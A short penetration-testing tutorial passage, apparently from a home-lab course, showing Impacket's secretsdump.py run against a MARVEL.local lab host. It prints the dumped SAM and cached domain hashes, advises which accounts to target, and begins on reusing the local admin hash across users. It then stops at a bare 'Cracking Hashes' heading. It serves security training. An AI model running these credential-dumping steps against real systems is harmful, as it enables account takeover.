## **Dumping Hashes with Secretsdump.py**


## **Usage**


```powershell
# Dumping SAM hashes
# secretsdump.py domain.tld/user:password@target_IP

$ secretsdump.py MARVEL.local/fcastle:Password1@192.168.0.132
```


**_Dumped Hashes :_**


```shell
--SNIP--

[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xa9b4a5489c5689b25cb65a48804aa1cc
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:938bb6f7cdaf9b1856e880fd28de914b:::
frankcastle:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
[*] Dumping cached domain logon information (domain/username:hash)
MARVEL.LOCAL/Administrator:$DCC2$10240#Administrator#c7154f935b7d1ace4c1d72bd4fb7889c
MARVEL.local/fcastle:$DCC2$10240#fcastle#e6f48c2526bd594441d3da3723155f6f


--SNIP--
```


**Note :** You should always focus on the hashes of  `administrator` and other users like `frankcastle` in our place, usually Guest, DefaultAccount and WDAGUtilityAccount are more of defaults account so there is no much to worry about.

Also watch out for **Wdigest** password cos' it is an old protocol on Windows 7, Windows 8 , 2008 R2 servers, This is used to store passwords in clear text 



### **Dumping Individual hashes with local admin hash**

sometimes we might not be able to dump hashes by just specifying the user like we did in the first step, we where able to dump `MARVEL.local/fcastle` hash but we where not able to dump `MARVEL.local/pparkers` hash, If we can dump a user hash, we can copy the local admin hash and try it out with other users to see if they share the same admin hash, then we can get a user
## **Cracking Hashes**